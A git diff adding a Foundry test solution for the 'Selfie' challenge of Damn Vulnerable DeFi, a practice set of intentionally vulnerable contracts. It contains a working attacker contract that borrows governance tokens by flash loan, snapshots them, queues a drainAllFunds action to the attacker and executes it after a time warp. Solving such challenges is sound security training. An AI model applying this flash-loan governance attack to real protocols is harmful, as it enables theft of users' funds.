@@ -3,10 +3,55 @@ pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
-
+import {console2} from "forge-std/console2.sol";
 import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
 import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
+
+contract SelfieAttacker {
+    SelfiePool public selfiePool;
+    SimpleGovernance public simpleGovernance;
+    DamnValuableTokenSnapshot public governanceToken;
+    address public owner;
+    uint256 public savedActionId;
+
+    constructor(
+        SelfiePool _selfiePool,
+        SimpleGovernance _simpleGovernance,
+        DamnValuableTokenSnapshot _governanceToken
+    ) {
+        selfiePool = _selfiePool;
+        simpleGovernance = _simpleGovernance;
+        governanceToken = _governanceToken;
+        owner = msg.sender;
+    }
+
+    function attack() public {
+        console2.log("attack entered");
+        uint256 flashLoanBalance = governanceToken.balanceOf(address(selfiePool));
+        selfiePool.flashLoan(flashLoanBalance);
+        console2.log("attack ended");
+    }
+
+    function attack2() public {
+        simpleGovernance.executeAction(savedActionId);
+    }
+
+    function receiveTokens(address token, uint256 borrowAmount) external {
+        console2.log("receive tokens entered");
+        // get a snapshot
+        uint256 snapshotId = governanceToken.snapshot();
+        console2.log("snapshotId:", snapshotId);
+        //prepare data payload
+        bytes memory attackingData = abi.encodeWithSignature("drainAllFunds(address)", owner);
+        //receiver needs to be selfie pool,
+        // data is attackingData,
+        // weiAmount is ether, we don't need ether. put ZERO
+        savedActionId = simpleGovernance.queueAction(address(selfiePool), attackingData, 0);
+        //return it
+        governanceToken.transfer(address(selfiePool), borrowAmount);
+    }
+}
 
 contract Selfie is Test {
     uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
@@ -47,6 +92,11 @@ contract Selfie is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        SelfieAttacker attackingContract = new SelfieAttacker(selfiePool, simpleGovernance, dvtSnapshot);
+        attackingContract.attack();
+        vm.warp(block.timestamp + 2 days);
+        attackingContract.attack2();
 
         /**
          * EXPLOIT END *
